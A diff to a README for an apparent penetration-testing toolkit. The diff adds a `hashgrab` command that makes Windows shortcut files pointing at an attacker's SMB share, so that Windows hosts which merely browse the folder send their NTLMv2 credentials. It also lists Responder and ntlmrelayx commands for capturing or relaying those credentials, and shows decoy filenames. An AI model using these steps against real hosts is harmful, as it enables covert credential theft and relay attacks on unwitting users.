@@ -18,7 +18,7 @@ From a local clone:
 pipx install .
 ```
 
-This installs three commands: `ft`, `hashcrack`, and `klist-pick`.
+This installs four commands: `ft`, `hashcrack`, `hashgrab`, and `klist-pick`.
 
 To reinstall after changes:
 
@@ -72,6 +72,33 @@ export KRB5CCNAME="FILE:/path/to/file.ccache"
 - Shows the currently active `KRB5CCNAME` if already set
 - Previews ticket details via `klist` before selecting
 - Warns if the selected ticket is expired
+
+---
+
+## hashgrab
+
+Generates a `.lnk` file whose icon location points to a UNC path on the attacker's machine. When a Windows host browses a folder containing the file, Explorer automatically attempts to resolve the icon over SMB — sending NTLMv2 credentials to a waiting listener without any user interaction beyond opening the folder.
+
+**Requirements:** Responder or ntlmrelayx listening on the attacker IP.
+
+**Usage:**
+```
+hashgrab <attacker-ip> <output-name>
+```
+
+`<output-name>` is the filename prefix — `.lnk` is appended automatically.
+
+**Examples:**
+```bash
+hashgrab 10.10.14.5 important_report
+hashgrab 192.168.1.10 Q3_Results
+```
+
+**Listener:**
+```bash
+sudo responder -I <interface>
+sudo ntlmrelayx.py -t smb://<target>
+```
 
 ---
 
